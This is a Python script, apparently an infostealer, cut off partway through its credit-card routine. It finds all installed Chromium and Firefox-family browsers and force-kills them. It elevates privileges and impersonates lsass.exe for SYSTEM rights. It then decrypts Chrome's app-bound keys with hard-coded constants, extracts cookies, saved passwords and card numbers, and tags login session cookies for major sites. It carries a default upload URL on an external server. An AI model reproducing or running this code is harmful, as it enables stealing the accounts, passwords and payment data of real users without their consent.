# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "PythonForWindows",
#     "cryptography",
#     "requests",
#     "cramjam",
#     "playwright",
# ]
# ///

import os
import io
import sys
import shutil
import subprocess
import time
import json
import struct
import ctypes
from ctypes import wintypes
import hashlib
import sqlite3
import pathlib
import binascii
import traceback
from contextlib import contextmanager
import tempfile
import argparse
import collections
from urllib.parse import urlparse

import windows
import windows.crypto
import windows.generated_def as gdef

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

import requests   # added for upload

# Playwright is used for IndexedDB extraction -- it can launch Chromium
# pointing at an existing profile and read IndexedDB via JavaScript, which
# is impossible to do reliably from raw LevelDB files.
try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False


# ---------------------------------------------------------------------------
# Default upload configuration (overridden by CLI arguments)
# ---------------------------------------------------------------------------
DEFAULT_UPLOAD_URL = "https://cookie-backend-production-c50b.up.railway.app/api/upload"
DEFAULT_NAME = "My export"

# ---------------------------------------------------------------------------
# Elevation / admin
# ---------------------------------------------------------------------------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def relaunch_as_admin():
    """Re-run this script elevated via a UAC prompt, then exit the current process."""
    # Re-use the same interpreter (the uv-managed venv python already has the deps).
    params = " ".join(f'"{a}"' for a in sys.argv)
    rc = ctypes.windll.shell32.ShellExecuteW(
        None,            # parent hwnd
        "runas",         # verb -> triggers the UAC elevation prompt
        sys.executable,  # program to run
        params,          # arguments (this script + its args)
        None,            # working dir
        1,               # SW_SHOWNORMAL
    )
    # ShellExecuteW returns a value > 32 on success.
    if rc <= 32:
        print(f"Failed to elevate (ShellExecuteW returned {rc}).")
        sys.exit(1)
    sys.exit(0)

@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token


# ---------------------------------------------------------------------------
# Browser catalog + discovery
# ---------------------------------------------------------------------------
# Each Chromium entry points at the "User Data" directory (which holds Local State
# and the per-profile folders). Opera keeps its default profile directly in the
# "Opera Stable" folder, which enumerate_chromium_profiles() handles.
CHROMIUM_CATALOG = [
    {"name": "Chrome",         "root_env": "LOCALAPPDATA", "subpath": r"Google\Chrome\User Data"},
    {"name": "Chrome Beta",    "root_env": "LOCALAPPDATA", "subpath": r"Google\Chrome Beta\User Data"},
    {"name": "Chrome Dev",     "root_env": "LOCALAPPDATA", "subpath": r"Google\Chrome Dev\User Data"},
    {"name": "Chrome Canary",  "root_env": "LOCALAPPDATA", "subpath": r"Google\Chrome SxS\User Data"},
    {"name": "Edge",           "root_env": "LOCALAPPDATA", "subpath": r"Microsoft\Edge\User Data"},
    {"name": "Edge Beta",      "root_env": "LOCALAPPDATA", "subpath": r"Microsoft\Edge Beta\User Data"},
    {"name": "Edge Dev",       "root_env": "LOCALAPPDATA", "subpath": r"Microsoft\Edge Dev\User Data"},
    {"name": "Brave",          "root_env": "LOCALAPPDATA", "subpath": r"BraveSoftware\Brave-Browser\User Data"},
    {"name": "Brave Beta",     "root_env": "LOCALAPPDATA", "subpath": r"BraveSoftware\Brave-Browser-Beta\User Data"},
    {"name": "Brave Nightly",  "root_env": "LOCALAPPDATA", "subpath": r"BraveSoftware\Brave-Browser-Nightly\User Data"},
    {"name": "Vivaldi",        "root_env": "LOCALAPPDATA", "subpath": r"Vivaldi\User Data"},
    {"name": "Opera",          "root_env": "APPDATA",      "subpath": r"Opera Software\Opera Stable"},
    {"name": "Opera GX",       "root_env": "APPDATA",      "subpath": r"Opera Software\Opera GX Stable"},
    {"name": "Opera Crypto",   "root_env": "APPDATA",      "subpath": r"Opera Software\Opera Crypto Stable"},
    {"name": "Yandex",         "root_env": "LOCALAPPDATA", "subpath": r"Yandex\YandexBrowser\User Data"},
    {"name": "Chromium",       "root_env": "LOCALAPPDATA", "subpath": r"Chromium\User Data"},
    {"name": "Epic",           "root_env": "LOCALAPPDATA", "subpath": r"Epic Privacy Browser\User Data"},
    {"name": "CocCoc",         "root_env": "LOCALAPPDATA", "subpath": r"CocCoc\Browser\User Data"},
    {"name": "Comodo Dragon",  "root_env": "LOCALAPPDATA", "subpath": r"Comodo\Dragon\User Data"},
    {"name": "360 Chrome",     "root_env": "LOCALAPPDATA", "subpath": r"360Chrome\Chrome\User Data"},
]

# Map test.py browser names → Playwright channel names (for system browser launch).
# Non-mapped browsers fall back to Playwright's bundled Chromium with user_data_dir.
_PLAYWRIGHT_CHANNEL = {
    "Chrome": "chrome",
    "Chrome Beta": "chrome-beta",
    "Chrome Dev": "chrome-dev",
    "Chrome Canary": "chrome-canary",
    "Edge": "msedge",
    "Edge Beta": "msedge-beta",
    "Edge Dev": "msedge-dev",
}

# Firefox-family: cookies live (unencrypted) in cookies.sqlite inside each profile
# folder under the "Profiles" directory.
FIREFOX_CATALOG = [
    {"name": "Firefox",    "root_env": "APPDATA", "subpath": r"Mozilla\Firefox\Profiles"},
    {"name": "LibreWolf",  "root_env": "APPDATA", "subpath": r"librewolf\Profiles"},
    {"name": "Waterfox",   "root_env": "APPDATA", "subpath": r"Waterfox\Profiles"},
    {"name": "Pale Moon",  "root_env": "APPDATA", "subpath": r"Moonchild Productions\Pale Moon\Profiles"},
]


def discover_chromium_browsers():
    """Return [{name, user_data}] for every Chromium browser actually installed."""
    found = []
    for b in CHROMIUM_CATALOG:
        root = os.environ.get(b["root_env"], "")
        if not root:
            continue
        user_data = os.path.join(root, b["subpath"])
        if os.path.isdir(user_data):
            found.append({"name": b["name"], "user_data": user_data})
    return found


def discover_firefox_browsers():
    """Return [{name, profiles_root}] for every Firefox-family browser installed."""
    found = []
    for b in FIREFOX_CATALOG:
        root = os.environ.get(b["root_env"], "")
        if not root:
            continue
        profiles_root = os.path.join(root, b["subpath"])
        if os.path.isdir(profiles_root):
            found.append({"name": b["name"], "profiles_root": profiles_root})
    return found


def enumerate_chromium_profiles(user_data):
    """Find every profile in a Chromium 'User Data' dir that has a cookie DB.

    Returns [{profile, cookie_db}]. Handles the modern 'Network\\Cookies' layout,
    the older 'Cookies' layout, and forks that keep the profile directly in User
    Data or nest it an extra level deep. The scan is depth-limited (two levels)
    so it stays fast and never hard-codes a specific profile layout.
    """
    profiles = []
    seen = set()

    def consider(profile_dir, label):
        for rel in (os.path.join("Network", "Cookies"), "Cookies"):
            db = os.path.join(profile_dir, rel)
            if os.path.isfile(db):
                key = os.path.normcase(os.path.dirname(db))
                if key in seen:
                    return True
                seen.add(key)
                profiles.append({"profile": label, "cookie_db": db})
                return True
        return False

    # Some forks keep the default profile directly in the User Data root.
    consider(user_data, "Default")

    try:
        top_entries = sorted(os.listdir(user_data))
    except OSError:
        return profiles

    for entry in top_entries:
        full = os.path.join(user_data, entry)
        if not os.path.isdir(full):
            continue
        if entry == "System Profile":   # no user cookies of interest
            continue
        if consider(full, entry):
            continue
        # One extra level for forks that nest the profile inside another folder.
        try:
            sub_entries = sorted(os.listdir(full))
        except OSError:
            continue
        for sub in sub_entries:
            if sub == "System Profile":
                continue
            sub_full = os.path.join(full, sub)
            if os.path.isdir(sub_full):
                consider(sub_full, entry)

    return profiles


def enumerate_firefox_profiles(profiles_root):
    """Return [{profile, cookie_db}] for each Firefox profile with a cookies.sqlite."""
    profiles = []
    try:
        entries = sorted(os.listdir(profiles_root))
    except OSError:
        return profiles
    for entry in entries:
        db = os.path.join(profiles_root, entry, "cookies.sqlite")
        if os.path.isfile(db):
            profiles.append({"profile": entry, "cookie_db": db})
    return profiles


# ---------------------------------------------------------------------------
# App-bound (v20) key derivation -- Chrome elevation-service constants
# ---------------------------------------------------------------------------
def parse_key_blob(blob_data: bytes) -> dict:
    # After the SYSTEM+user DPAPI unwraps, the plaintext is laid out as
    #   [header_len(4) | header(validation_data) | content_len(4) | content]
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['content_len'] = content_len

    # --- Non-Google-branded Chromium (Edge, Brave, ...) --------------------
    # These builds do NOT apply Chrome's extra elevation-service encryption
    # layer, so `content` IS already the raw 32-byte app-bound (v20) key.
    # (Google Chrome instead stores [flag|iv|ciphertext|tag] that needs one
    # more AES/ChaCha decrypt with a key baked into elevation_service.exe.)
    if content_len == 32:
        parsed_data['flag'] = 0            # sentinel: raw key, no further decrypt
        parsed_data['master_key'] = buffer.read(32)
        return parsed_data

    parsed_data['flag'] = buffer.read(1)[0]

    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        # [flag|iv|ciphertext|tag] decrypted_blob
        # [1byte|12bytes|32bytes|16bytes]
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
        # [1byte|32bytes|12bytes|32bytes|16bytes]
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']} (content_len={content_len})")

    return parsed_data

def decrypt_with_cng(input_data, key_names=("Google Chromekey1",)):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    opened = False
    last_error = None
    # The app-bound key name differs per Chromium vendor, so try each candidate
    # instead of assuming a single hard-coded name. Chrome's is "Google Chromekey1".
    for key_name in key_names:
        status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
        if status == 0:
            opened = True
            break
        last_error = status
    if not opened:
        ncrypt.NCryptFreeObject(hProvider)
        raise OSError(f"NCryptOpenKey failed for {key_names}: status {last_error}")

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 0:
        # Non-Google-branded Chromium (Edge, Brave, ...): the content already IS
        # the 32-byte app-bound master key -- no extra decrypt needed.
        return parsed_data['master_key']

    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)

    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)

    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)

    return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)


# Force-close browsers before reading, so locked cookie DBs unlock. On by default
# (browsers like Edge keep the DB locked while running); pass --no-close to skip.
CLOSE_BROWSERS = True

# Process image names to terminate when CLOSE_BROWSERS is on. Covers the browsers
# in CHROMIUM_CATALOG / FIREFOX_CATALOG. (browser.exe = Yandex/CocCoc.)
BROWSER_PROCESS_NAMES = [
    "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "opera_gx.exe",
    "vivaldi.exe", "yandex.exe", "browser.exe", "chromium.exe", "epic.exe",
    "dragon.exe", "360chrome.exe", "360se.exe",
    "firefox.exe", "librewolf.exe", "waterfox.exe", "palemoon.exe",
]


def close_browsers(emit):
    """Force-close known browser processes so their cookie databases unlock.

    Uses taskkill /F /T per image name. Processes that aren't running just return
    'not found', which we ignore. A short pause lets Windows release file handles.
    """
    emit("Closing browsers so their cookie databases unlock (pass --no-close to skip)...")
    closed = []
    for name in BROWSER_PROCESS_NAMES:
        try:
            res = subprocess.run(
                ["taskkill", "/F", "/T", "/IM", name],
                capture_output=True, text=True,
                creationflags=0x08000000,   # CREATE_NO_WINDOW
            )
            if res.returncode == 0:
                closed.append(name)
        except Exception:
            pass
    if closed:
        emit("  closed: " + ", ".join(closed))
        time.sleep(2)   # give the OS a moment to release the file locks
    else:
        emit("  (no running browsers matched)")


def get_v20_master_key(local_state: dict, browser_name: str = "Chrome"):
    """Derive the v20 (app-bound) master key from Local State, or None if absent.

    Works entirely offline (needs admin/elevation): unwrap the app-bound blob with
    SYSTEM DPAPI (via lsass) then user DPAPI, then either return the raw 32-byte key
    -- Edge and other non-Google-branded Chromium -- or run Chrome's extra
    elevation-service decrypt (flags 1-3). Raises if it can't derive the key.
    """
    osc = local_state.get("os_crypt", {})
    b64 = osc.get("app_bound_encrypted_key")
    if not b64:
        return None
    raw = binascii.a2b_base64(b64)
    if raw[:4] != b"APPB":
        return None
    encrypted_blob = raw[4:]

    with impersonate_lsass():
        sys_decrypted = windows.crypto.dpapi.unprotect(encrypted_blob)
    user_decrypted = windows.crypto.dpapi.unprotect(sys_decrypted)
    parsed = parse_key_blob(user_decrypted)
    return derive_v20_master_key(parsed)


def get_v10_master_key(local_state: dict):
    """Derive the v10 (DPAPI) master key from Local State, or None if absent.

    This is the classic Chromium scheme and works for EVERY Chromium browser --
    the key is DPAPI-protected under the current user only (no SYSTEM needed).
    """
    osc = local_state.get("os_crypt", {})
    b64 = osc.get("encrypted_key")
    if not b64:
        return None
    raw = binascii.a2b_base64(b64)
    if raw[:5] != b"DPAPI":
        return None
    return windows.crypto.dpapi.unprotect(raw[5:])


# ---------------------------------------------------------------------------
# Cookie value decryption
# ---------------------------------------------------------------------------
def _domain_hash_prefix_len(plaintext: bytes, host_key: str) -> int:
    """v20 (and some newer v10) cookies prepend SHA-256(domain) to the plaintext.

    Return 32 if the first 32 bytes match the hash of this cookie's host, else 0.
    """
    if len(plaintext) < 32 or not host_key:
        return 0
    bare = host_key.lstrip(".")
    for cand in (host_key, bare, "." + bare):
        if hashlib.sha256(cand.encode("utf-8")).digest() == plaintext[:32]:
            return 32
    return 0


def strip_domain_hash(plaintext: bytes, host_key: str, version: str) -> bytes:
    n = _domain_hash_prefix_len(plaintext, host_key)
    if n:
        return plaintext[n:]
    # v20 always carries the prefix even if the hash form didn't match above.
    if version == "v20" and len(plaintext) >= 32:
        return plaintext[32:]
    return plaintext


def _aesgcm_cookie(encrypted_value: bytes, key: bytes, host: str, version: str, strip_hash: bool = True) -> str:
    """Decrypt a v10/v20 value: [prefix(3) | iv(12) | ciphertext | tag(16)].

    Only cookies prepend a SHA-256(domain) prefix to the plaintext; passwords and
    credit cards do not. Pass strip_hash=False for those.
    """
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        plaintext = AESGCM(key).decrypt(iv, ciphertext + tag, None)
        if strip_hash:
            plaintext = strip_domain_hash(plaintext, host, version)
        return plaintext.decode("utf-8", "replace")
    except Exception as e:
        return f"<decrypt failed: {e}>"


def decrypt_chromium_value(encrypted_value: bytes, host: str, v10_key, v20_key, domain_bound: bool = True):
    """Decrypt one Chromium value.

    Returns (value, version). value is None only when we recognise the value
    type but lack the key for it (so the caller can count it as 'skipped').
    version is one of: v20, v10, dpapi, empty.

    domain_bound is True for cookies (which carry the SHA-256(domain) prefix) and
    False for passwords / credit cards (which do not).
    """
    if not encrypted_value:
        return "", "empty"

    prefix = bytes(encrypted_value[:3])
    if prefix == b"v20":
        if v20_key is None:
            return None, "v20"
        return _aesgcm_cookie(encrypted_value, v20_key, host, "v20", strip_hash=domain_bound), "v20"
    if prefix == b"v10":
        if v10_key is None:
            return None, "v10"
        return _aesgcm_cookie(encrypted_value, v10_key, host, "v10", strip_hash=domain_bound), "v10"

    # Legacy: the whole value is a raw DPAPI blob (pre-v10 Chromium).
    try:
        decrypted = windows.crypto.dpapi.unprotect(bytes(encrypted_value))
        return decrypted.decode("utf-8", "replace"), "dpapi"
    except Exception as e:
        return f"<decrypt failed: {e}>", "dpapi"


# ---------------------------------------------------------------------------
# Cookie classification / grouping (browser-agnostic)
# ---------------------------------------------------------------------------
# Cookie name patterns that typically carry the actual "logged-in" credential
# (session tokens, auth tokens) rather than analytics / advertising / consent
# junk. Everything here is matched case-insensitively.
LOGIN_COOKIE_EXACT = {
    # Google / YouTube
    "sid", "hsid", "ssid", "apisid", "sapisid", "sidcc", "login_info",
    "__secure-1psid", "__secure-3psid", "__secure-1psidcc", "__secure-3psidcc",
    "__secure-1psidts", "__secure-3psidts",
    # X / Twitter
    "auth_token", "twid", "ct0",
    # LinkedIn
    "li_at", "li_rm", "liap", "jsessionid",
    # Facebook / Meta
    "c_user", "xs",
    # GitHub
    "user_session", "dotcom_user", "logged_in",
    # Cursor / WorkOS
    "workoscursorsessiontoken", "workos_id", "access-token",
    # common web frameworks
    "sessionid", "session_id", "phpsessid", "connect.sid",
    "laravel_session", "laravelssessionnew", "_session",
    "access_token", "refresh_token", "id_token",
}
LOGIN_COOKIE_KEYWORDS = (
    "login", "session", "auth", "sapisid", "psid", "oauth", "sso",
    "jwt", "account", "credential", "remember",
)
# Names that contain a login-ish keyword but are NOT actually sign-in credentials.
NON_LOGIN_HINTS = ("csrf", "xsrf", "guest", "anon", "consent", "marketing",
                   "device", "visitor", "chain_token", "stable_id")

def is_login_cookie(name: str) -> bool:
    """Best-effort guess: does this cookie name look like a sign-in credential?"""
    n = (name or "").lower()
    if n in LOGIN_COOKIE_EXACT:
        return True
    if any(bad in n for bad in NON_LOGIN_HINTS):
        return False
    return any(k in n for k in LOGIN_COOKIE_KEYWORDS)

# Common second-level ccTLDs that the naive last-two-labels heuristic gets wrong
# (e.g. "a.example.co.uk" would otherwise collapse to "co.uk"). Kept intentionally
# small; full resolution would require the Public Suffix List.
_MULTI_PART_TLDS = {
    "co.uk", "org.uk", "ac.uk", "gov.uk", "me.uk", "net.uk", "ltd.uk", "plc.uk",
    "com.ng", "org.ng", "net.ng", "edu.ng", "gov.ng",
    "com.au", "net.au", "org.au", "edu.au", "gov.au",
    "co.za", "org.za", "net.za", "gov.za",
    "co.nz", "net.nz", "org.nz", "gov.nz",
    "com.br", "net.br", "org.br", "gov.br",
    "co.jp", "ne.jp", "or.jp", "ac.jp", "go.jp",
    "co.in", "net.in", "org.in", "gov.in", "ac.in",
    "com.mx", "org.mx", "gob.mx",
    "com.ar", "org.ar", "gov.ar",
    "com.tr", "org.tr", "net.tr",
    "com.sg", "org.sg", "net.sg", "edu.sg",
    "com.hk", "org.hk", "net.hk", "edu.hk", "gov.hk",
    "co.kr", "or.kr", "ne.kr", "go.kr", "ac.kr",
    "com.my", "org.my", "net.my", "edu.my",
    "com.eg", "org.eg", "net.eg", "edu.eg", "gov.eg",
    "com.ph", "org.ph", "net.ph", "edu.ph", "gov.ph",
    "com.pk", "org.pk", "net.pk", "edu.pk", "gov.pk",
}


def registrable_domain(host_key: str) -> str:
    """Collapse a cookie host to its registrable site so a site's cookies group
    together, e.g. '.www.youtube.com' -> 'youtube.com', 'a.b.example.co.uk' ->
    'example.co.uk'."""
    host = (host_key or "").lstrip(".")
    labels = host.split(".")
    if len(labels) <= 2:
        return host
    if len(labels) >= 3 and ".".join(labels[-2:]).lower() in _MULTI_PART_TLDS:
        return ".".join(labels[-3:])
    return ".".join(labels[-2:])


# ---------------------------------------------------------------------------
# Reading cookie databases (copy first -- the live DB is usually locked)
# ---------------------------------------------------------------------------
def _create_file_shared(path):
    """Open a file for reading with FULL sharing so a running browser's lock
    (which blocks a plain copy) doesn't stop us. Returns a Windows handle."""
    CreateFileW = ctypes.windll.kernel32.CreateFileW
    CreateFileW.restype = ctypes.c_void_p
    CreateFileW.argtypes = [ctypes.c_wchar_p, wintypes.DWORD, wintypes.DWORD,
                            ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
    GENERIC_READ = 0x80000000
    FILE_SHARE_ALL = 0x1 | 0x2 | 0x4    # READ | WRITE | DELETE
    OPEN_EXISTING = 3
    FILE_ATTRIBUTE_NORMAL = 0x80
    handle = CreateFileW(path, GENERIC_READ, FILE_SHARE_ALL, None,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
    if not handle or handle == ctypes.c_void_p(-1).value:
        raise ctypes.WinError()
    return handle


def _copy_locked(src, dst):
    """Copy src -> dst even if another process holds src open. Fast path is a
    normal copy; the fallback streams the bytes through a shared-read handle."""
    try:
        shutil.copy2(src, dst)
        return
    except (PermissionError, OSError):
        pass   # locked -> shared-read fallback below

    kernel32 = ctypes.windll.kernel32
    ReadFile = kernel32.ReadFile
    ReadFile.argtypes = [ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD,
                         ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    ReadFile.restype = wintypes.BOOL

    handle = _create_file_shared(src)
    try:
        buf = ctypes.create_string_buffer(1024 * 1024)
        got = wintypes.DWORD(0)
        with open(dst, "wb") as out:
            while True:
                if not ReadFile(handle, buf, ctypes.sizeof(buf), ctypes.byref(got), None):
                    raise ctypes.WinError()
                if got.value == 0:
                    break
                out.write(buf.raw[:got.value])
    finally:
        kernel32.CloseHandle(ctypes.c_void_p(handle))


def _read_sqlite(cookie_db, query, emit):
    """Copy a (possibly locked) cookie DB to temp and run the query.

    Brings the -wal/-shm sidecars along so a *running* browser's most recent
    cookies are included, then opens the copy read/write so SQLite can replay the
    WAL. Falls back to an immutable (WAL-ignoring) open if the live copy is torn.
    """
    rows = []
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db = os.path.join(temp_dir, "Cookies")
        try:
            _copy_locked(cookie_db, temp_db)
        except OSError as e:
            emit(f"    ! could not read cookie DB (locked, shared copy failed): {e}")
            return rows

        for suffix in ("-wal", "-shm"):
            side = cookie_db + suffix
            if os.path.isfile(side):
                try:
                    _copy_locked(side, temp_db + suffix)
                except OSError:
                    pass

        con = None
        try:
            try:
                con = sqlite3.connect(temp_db)          # r/w copy -> WAL applied
                cur = con.cursor()
                cur.execute(query)
                rows = cur.fetchall()
            except sqlite3.DatabaseError:
                # Torn copy of a live DB -> re-open ignoring the WAL and locks.
                if con is not None:
                    con.close()
                    con = None
                uri = pathlib.Path(temp_db).as_uri() + "?immutable=1"
                con = sqlite3.connect(uri, uri=True)
                cur = con.cursor()
                cur.execute(query)
                rows = cur.fetchall()
        except sqlite3.Error as e:
            emit(f"    ! sqlite error on {cookie_db}: {e}")
        finally:
            if con is not None:
                con.close()
    return rows


def read_chromium_cookies(cookie_db, emit):
    """Read ALL cookie attributes from Chromium's SQLite cookies table.

    Returns list of (host, name, encrypted_value, path, expires, secure,
    httponly, samesite, priority, source_scheme). The cookie value is still
    encrypted at this point — the caller decrypts it with v10/v20 keys.
    """
    return _read_sqlite(
        cookie_db,
        "SELECT host_key, name, CAST(encrypted_value AS BLOB),"
        "       path, expires_utc, is_secure, is_httponly,"
        "       samesite, priority, source_scheme"
        " FROM cookies;",
        emit,
    )


def read_firefox_cookies(cookie_db, emit):
    return _read_sqlite(
        cookie_db,
        "SELECT host, name, value FROM moz_cookies;",
        emit,
    )


# ---------------------------------------------------------------------------
# Per-browser processing
# ---------------------------------------------------------------------------
def process_chromium_browser(browser, emit):
    """Decrypt every profile of one Chromium browser. Returns a list of records."""
    records = []
    user_data = browser["user_data"]
    name = browser["name"]

    # Local State (holds both the v10 and v20 keys) lives at the User Data root.
    local_state = {}
    ls_path = os.path.join(user_data, "Local State")
    if os.path.isfile(ls_path):
        try:
            with open(ls_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
        except Exception as e:
            emit(f"    ! could not read Local State: {e}")

    v10_key = None
    v20_key = None
    try:
        v10_key = get_v10_master_key(local_state)
    except Exception as e:
        emit(f"    ! v10 key unavailable: {e}")
    try:
        v20_key = get_v20_master_key(local_state, name)
    except Exception as e:
        # If a browser uses an unknown app-bound scheme, v10 cookies still work.
        emit(f"    ! v20 (app-bound) key not derivable for {name} (v10 cookies still handled): {e}")

    profiles = enumerate_chromium_profiles(user_data)
    if not profiles:
        emit("    (no cookie databases found)")
        return records

    for prof in profiles:
        rows = read_chromium_cookies(prof["cookie_db"], emit)
        ok = skipped = failed = 0
        for host, cname, enc, path, expires, secure, httponly, samesite, priority, source_scheme in rows:
            value, version = decrypt_chromium_value(enc, host, v10_key, v20_key)
            if value is None:            # recognised but no key for it
                skipped += 1
                continue
            if isinstance(value, str) and value.startswith("<decrypt failed"):
                failed += 1
            records.append({
                "browser": name,
                "profile": prof["profile"],
                "site": registrable_domain(host),
                "host": host,
                "name": cname,
                "value": value,
                "path": path or "/",
                "expires": expires,           # WebKit/Windows epoch (µs since 1601)
                "secure": bool(secure),
                "httponly": bool(httponly),
                "samesite": samesite,         # -1=unspecified, 0=None, 1=Lax, 2=Strict
                "priority": priority if priority is not None else 1,
                "source_scheme": source_scheme if source_scheme is not None else 0,
                "is_login": is_login_cookie(cname),
                "version": version,
            })
            ok += 1
        note = f"    profile '{prof['profile']}': {ok} cookies decrypted"
        if skipped:
            note += f", {skipped} v20 skipped (no app-bound key)"
        if failed:
            note += f", {failed} failed"
        emit(note)

    return records


def process_firefox_browser(browser, emit):
    """Read every profile of one Firefox-family browser (cookies are plaintext)."""
    records = []
    name = browser["name"]
    profiles = enumerate_firefox_profiles(browser["profiles_root"])
    if not profiles:
        emit("    (no cookie databases found)")
        return records

    for prof in profiles:
        rows = read_firefox_cookies(prof["cookie_db"], emit)
        for host, cname, value in rows:
            records.append({
                "browser": name,
                "profile": prof["profile"],
                "site": registrable_domain(host or ""),
                "host": host or "",
                "name": cname or "",
                "value": value if value is not None else "",
                "is_login": is_login_cookie(cname or ""),
                "version": "plain",
            })
        emit(f"    profile '{prof['profile']}': {len(rows)} cookies (plaintext)")

    return records


# ---------------------------------------------------------------------------
# Password extraction from Login Data SQLite
# ---------------------------------------------------------------------------
def read_chromium_passwords(profile_path, v10_key, v20_key, emit):
    """Read Login Data SQLite → list of (origin_url, username, decrypted_password).

    The Login Data file sits beside the Cookies file in each Chromium profile.
    It uses the SAME v10/v20 encryption keys — passwords are encrypted identically
    to cookies: [prefix(3)|iv(12)|ciphertext|tag(16)] with AES-256-GCM.
    """
    login_db = None
    for candidate in (os.path.join(profile_path, "Login Data"),
                       os.path.join(profile_path, "..", "Login Data")):  # Opera layout
        if os.path.isfile(candidate):
            login_db = candidate
            break
    if not login_db:
        return []

    rows = _read_sqlite(
        login_db,
        "SELECT origin_url, username_value, password_value FROM logins;",
        emit,
    )
    results = []
    ok = skipped = failed = 0
    for url, username, enc_pw in rows:
        if not enc_pw:
            continue
        value, version = decrypt_chromium_value(enc_pw, url or "", v10_key, v20_key, domain_bound=False)
        if value is None:            # recognised but no key for it
            skipped += 1
            continue
        if isinstance(value, str) and value.startswith("<decrypt failed"):
            failed += 1
            continue
        results.append({
            "url": url or "",
            "username": username or "",
            "password": value,
            "version": version,
        })
        ok += 1
    if ok or skipped or failed:
        note = f"    passwords: {ok} decrypted"
        if skipped:
            note += f", {skipped} v20 skipped"
        if failed:
            note += f", {failed} failed"
        emit(note)
    return results


# ---------------------------------------------------------------------------
# Credit card extraction from Web Data SQLite
# ---------------------------------------------------------------------------
def read_chromium_credit_cards(profile_path, v10_key, v20_key, emit):
    """Read Web Data SQLite → list of (name, number, exp_month, exp_year).

    The Web Data file is in the same profile directory as Cookies and Login Data.
    Card numbers are encrypted with the same v10/v20 scheme.
    """
    web_db = None
    for candidate in (os.path.join(profile_path, "Web Data"),
                       os.path.join(profile_path, "..", "Web Data")):  # Opera layout
        if os.path.isfile(candidate):
            web_db = candidate
            break
    if not web_db:
        return []

    rows = _read_sqlite(
        web_db,
        "SELECT name_on_card, expiration_month, expiration_year, "
        "card_number_encrypted FROM credit_cards;",
        emit,
    )
    results = []
    ok = skipped = failed = 0
    for name, exp_m, exp_y, enc_num in rows:
        if not enc_num:
            continue
        number, version = decrypt_chromium_value(enc_num, "", v10_key, v20_key, domain_bound=False)
        if number is None:
            skipped += 1
            continue
        if isinstance(number, str) and number.startswith("<decrypt failed"):
